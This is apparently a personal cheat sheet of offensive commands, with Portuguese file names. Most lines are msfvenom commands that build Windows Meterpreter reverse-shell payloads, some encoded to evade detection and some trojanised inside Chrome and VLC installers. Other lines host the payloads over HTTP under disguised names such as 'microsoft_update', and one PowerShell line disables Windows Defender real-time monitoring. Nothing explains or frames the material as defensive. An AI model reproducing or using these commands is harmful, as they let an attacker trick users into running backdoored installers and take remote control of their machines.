msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.137 LPORT=443 -f exe -x ChromeSetup.exe -o chrome_infectado.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.137 LPORT=4444 -f exe > atibaia_payload.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<seu_ip> LPORT=443 -f exe -x vlc_setup.exe -o vlc_infectado.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.137 LPORT=4444 -f psh > payload.ps1

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe > trojan.exe


python3 -m http.server 8080

http://192.168.1.137:8080/vlc_infectado.exe

http://192.168.1.137:8080/documento_infectado.rtf

http://192.168.1.137:8080/microsoft_update.page.zip

http://192.168.1.137/payload.ps1

Test-NetConnection 192.168.1.137 -Port 443

Set-MpPreference -DisableRealtimeMonitoring $true

https://software.download.prss.microsoft.com/dbazure/Win10_22H2_BrazilianPortuguese_x64v1.iso?t=e5e99b27-438b-431d-9d64-86489e182f98&P1=1744405381&P2=601&P3=2&P4=f40ON0oovKGJWGrY%2bug6FI0LMLMWQtsvrWn70G6yYXtMIjlTOdYcUPmEFJ4fO4BwBAuqxNwVixbL6CKd5zlyIAo%2bKvg57n3vO%2bWSZCpo2zky%2blfaamqH%2bKPP33l4jKvGj%2b8HzqiUtM1Q7uGHgoyS3GDDE%2fW4gWCl0O7%2fy%2bB8qLzHK350i3CmZUBY4voa0qJbNO3GD0lb5FePTgvJbWJ4WolWV54uOsGOCtttwlJ5Y3KoIVmVLr9q9Q%2fNc2bf%2bayvgolgzwfqIPY9LN6rG5xyHEE2Evmp6nVsA%2f20SE7yb5v0603UZJmgpTIvrcCDOlq4Us75%2f4ONVSLaXKm3Qx6cyg%3d%3d




 
